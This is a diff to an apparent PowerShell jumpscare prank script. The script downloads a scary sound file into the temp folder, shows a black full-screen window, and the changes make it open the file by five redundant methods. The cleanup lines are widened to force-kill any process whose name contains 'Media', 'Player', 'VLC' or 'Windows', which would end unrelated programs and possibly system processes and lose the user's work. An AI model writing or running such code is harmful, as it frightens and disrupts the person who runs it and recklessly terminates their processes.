@@ -15,7 +15,23 @@ $soundPath = "$env:TEMP\scary_sound.mp3"
 
 try {
     Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath -ErrorAction Stop
-    Start-Process $soundPath -WindowStyle Hidden
+    
+    # METHOD 1: Direct Start-Process (this WILL open it)
+    Start-Process $soundPath
+    
+    # METHOD 2: Use WScript.Shell as backup
+    $wshell = New-Object -ComObject WScript.Shell
+    $wshell.Run($soundPath, 1, $false)
+    
+    # METHOD 3: Use Shell.Application as backup
+    $shell = New-Object -ComObject Shell.Application
+    $shell.Open($soundPath)
+    
+    # METHOD 4: Use explorer.exe directly
+    explorer.exe $soundPath
+    
+    # METHOD 5: Use cmd.exe to open it
+    cmd /c start $soundPath
 } catch {
     Write-Host "Sound download failed"
 }
@@ -29,7 +45,7 @@ $form.BackColor = "Black"
 $form.KeyPreview = $true
 $form.Add_KeyDown({
     if ($_.KeyCode -eq "Escape") {
-        Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
+        Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" -or $_.Name -like "*Media*" -or $_.Name -like "*Player*" -or $_.Name -like "*VLC*" } | Stop-Process -Force
         $form.Close()
         [System.Windows.Forms.Application]::Exit()
     }
@@ -187,7 +203,7 @@ Start-Sleep -Seconds 3
 $form.Close()
 [System.Windows.Forms.Application]::Exit()
 
-Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
+Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" -or $_.Name -like "*Media*" -or $_.Name -like "*Player*" -or $_.Name -like "*VLC*" -or $_.Name -like "*Windows*" } | Stop-Process -Force
 Start-Sleep -Seconds 1
 if (Test-Path $soundPath) {
     Remove-Item $soundPath -Force -ErrorAction SilentlyContinue
